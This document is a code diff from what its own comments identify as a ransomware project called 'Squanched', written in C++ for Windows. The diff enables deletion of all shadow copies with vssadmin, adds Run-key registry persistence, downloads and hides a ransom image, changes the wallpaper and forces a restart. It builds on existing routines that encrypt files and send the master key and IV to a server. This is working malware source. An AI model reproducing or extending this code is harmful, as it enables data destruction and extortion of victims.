@@ -21,14 +21,29 @@ Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
 
-
+Status changeWallPaper();
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
+void doRestart();
+void makeFileHidden(string path);
+void RegisterProgram();
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
+	
 	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
+	string pathToImage = get_home() + R"(\squanched.jpg)";
+#if VM
+	RegisterProgram();
+#endif
+	changeHiddenFileState(false);
+	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
+	makeFileHidden(pathToImage);
 	string pathToID = get_home() + R"(\SquanchedID.id)";
+#if VM
+	changeWallPaper();
+#endif
+	//TODO set SquanchedID and IMAGE invisible
 	std::ofstream IDFile;
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
@@ -58,8 +73,10 @@ int main(int argc, char* argv[]) {
 	{
 		goto CLEAN;
 	}
-//	destroyVSS();
-	changeHiddenFileState(false);
+#if VM
+	destroyVSS();
+#endif
+	
 
 //	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
 //	std::ofstream masterKeyIVFile;
@@ -73,8 +90,8 @@ int main(int argc, char* argv[]) {
 	
 	IDFile.open(pathToID, std::ios::binary);
 	IDFile.write((char*)id, ID_LEN);
-	DWORD attributes = GetFileAttributes(pathToID.c_str());
-	SetFileAttributes(pathToID.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+	makeFileHidden(pathToID);
+
 	IDFile.close();
 
 	changeHiddenFileState(true);
@@ -105,6 +122,9 @@ CLEAN:
 		HeapFree(GetProcessHeap(), 0, masterIV);
 	if (id)
 		HeapFree(GetProcessHeap(), 0, id);
+#if VM
+	doRestart();
+#endif
 	return 0;
 }
 
@@ -135,9 +155,14 @@ Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
 	return status;
 }
 
+void makeFileHidden(string path)
+{
+	DWORD attributes = GetFileAttributes(path.c_str());
+	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+}
 void destroyVSS()
 {
-	//ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
+	ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
 }
 
 void changeHiddenFileState(bool state)
@@ -229,8 +254,7 @@ void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, si
 	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
 	ofile.write((char*)cipherText, cipherLen);
 	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
-	DWORD attributes = GetFileAttributes((path + LOCKED_EXTENSION).c_str());
-	SetFileAttributes((path + LOCKED_EXTENSION).c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+	makeFileHidden(path + LOCKED_EXTENSION);
 	ofile.close();
 	
 }
@@ -363,7 +387,6 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
 {
 	Status status;
 	/* following will slow down the whole process*/
-	//TODO encapsulate in function
 	hCurrentProcess = GetCurrentProcess();
 	if (nullptr == hCurrentProcess)
 	{
@@ -402,6 +425,74 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
 	);
 	return status;
 }
+
+Status changeWallPaper()
+{
+	int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, R"()", SPIF_UPDATEINIFILE);
+	if(!return_value)
+	{
+		return STATUS_UNSUCCESSFUL;
+	}
+	return STATUS_SUCCESS;
+}
+
+void doRestart()
+{
+	InitiateSystemShutdown(NULL, NULL, 0, true, true);
+}
+
+
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args != NULL)
+	{
+		// caller should make sure "args" is quoted if any single argument has a space
+		// e.g. (L"-name \"Mark Voidale\"");
+		wcscat_s(szValue, count, args);
+	}
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		dwSize = (wcslen(szValue) + 1) * 2;
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+void RegisterProgram()
+{
+	wchar_t szPathToExe[MAX_PATH];
+
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
+}
+
 
 //string get_username() {
 //#ifdef _WIN32
